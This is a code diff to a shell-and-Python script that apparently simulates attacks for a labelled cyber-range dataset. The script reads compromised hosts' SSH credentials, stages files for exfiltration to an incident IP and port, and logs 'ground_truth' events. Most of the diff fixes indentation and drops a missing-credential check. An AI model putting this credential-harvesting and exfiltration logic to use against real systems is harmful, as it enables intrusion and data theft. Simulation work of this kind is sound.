@@ -221,7 +221,7 @@ fi
 #
 # Format:
 #
-# IP|PLATFORM|ACCESS|PORT|USER|PASSWORD|FILE|SIZE|HASH#
+# IP|PLATFORM|ACCESS|PORT|USER|PASSWORD|FILE|SIZE|HASH
 
 # Old Linux-only staged-data.json is also supported.
 # ============================================================
@@ -232,6 +232,9 @@ mapfile -t STAGED_HOSTS < <(
 import json
 import sys
 
+with open(sys.argv[1], encoding="utf-8") as f:
+    data = json.load(f)
+
 with open(sys.argv[2], encoding="utf-8") as f:
     compromised_data = json.load(f)
 
@@ -240,7 +243,6 @@ compromised_by_ip = {
     for host in compromised_data.get("hosts", [])
     if host.get("ip")
 }
-
 
 for host in data.get("hosts", []):
 
@@ -252,7 +254,7 @@ for host in data.get("hosts", []):
     if not ip:
         continue
 
-        compromised = compromised_by_ip.get(ip, {})
+    compromised = compromised_by_ip.get(ip, {})
 
     platform = host.get(
         "platform",
@@ -275,26 +277,26 @@ for host in data.get("hosts", []):
 
     if platform == "linux":
 
-    port = host.get(
-        "ssh_port",
-        22
-    )
+        port = host.get(
+            "ssh_port",
+            22
+        )
 
-    user = (
-        compromised.get("ssh_username")
-        or compromised.get("ssh_user")
-        or host.get("ssh_username")
-        or host.get("ssh_user")
-        or "ubuntu"
-    )
+        user = (
+            compromised.get("ssh_username")
+            or compromised.get("ssh_user")
+            or host.get("ssh_username")
+            or host.get("ssh_user")
+            or "ubuntu"
+        )
 
-    password = (
-        compromised.get("ssh_password")
-        or compromised.get("password")
-        or ""
-    )
+        password = (
+            compromised.get("ssh_password")
+            or compromised.get("password")
+            or ""
+        )
 
-    access = "ssh"
+        access = "ssh"
 
 
     elif platform == "windows":
@@ -675,24 +677,7 @@ for RECORD in "${STAGED_HOSTS[@]}"; do
         "EXFIL_START source=$HOST platform=$PLATFORM destination=$INCIDENT_IP:$EXFIL_PORT file=$REMOTE_FILE"
 
 
-    # ========================================================
-    # LINUX
-    # ========================================================
-
-    if [[ "$PLATFORM" == "linux" ]]; then
-
-
-        if [[ -z "$ACCESS_PASSWORD" ]]; then
-
-            FAILED_COUNT=$(( FAILED_COUNT + 1 ))
-
-            log "[WARNING] SSH password unavailable for $HOST"
-
-            ground_truth \
-                "EXFIL_FAILED source=$HOST platform=linux reason=missing_credentials"
-
-            continue
-        # ========================================================
+# ========================================================
 # LINUX
 # ========================================================
 
